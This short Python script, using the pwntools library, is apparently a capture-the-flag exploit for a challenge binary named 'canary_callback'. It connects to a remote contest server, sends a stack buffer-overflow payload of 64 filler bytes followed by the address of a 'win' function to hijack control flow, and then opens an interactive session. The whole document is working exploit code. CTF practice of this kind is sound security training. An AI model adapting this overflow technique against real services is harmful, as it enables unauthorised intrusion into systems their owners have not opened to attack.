from pwn import *

elf = context.binary = ELF('./canary_callback', checksec=False)
#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13530)
p.recvuntil(b'incantation:\n')
payload = b'A' * 64 + p64(elf.sym.win)
p.send(payload)

p.interactive()